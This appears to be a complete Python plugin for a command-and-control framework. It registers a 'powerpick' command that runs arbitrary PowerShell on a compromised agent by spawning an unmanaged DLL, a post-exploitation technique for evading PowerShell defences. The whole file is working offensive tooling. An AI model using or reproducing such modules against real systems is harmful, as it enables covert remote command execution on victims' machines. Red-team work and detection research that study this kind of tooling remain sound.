
from vaelix_host import Agent, RegisterCommand

def PowerPick(agentID, *param):
    TaskID   : str    = None
    agent    : Agent  = None
    packer   = Packer()

    agent  = Agent( agentID )

    if agent.ProcessArch == 'x86':
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "x86 is not supported" )
        return False

    if len( param ) < 1:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough arguments" )
        return

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, "Tasked agent to execute unmanaged powershell commands" )

    packer.addstr( " " + ''.join( param ) )
    agent.DllSpawn( TaskID, "bin/PowerPick.x64.dll", packer.getbuffer() )

    return TaskID

RegisterCommand( PowerPick, "", "powerpick", "executes unmanaged powershell commands", 0, "[args]", "whoami" )
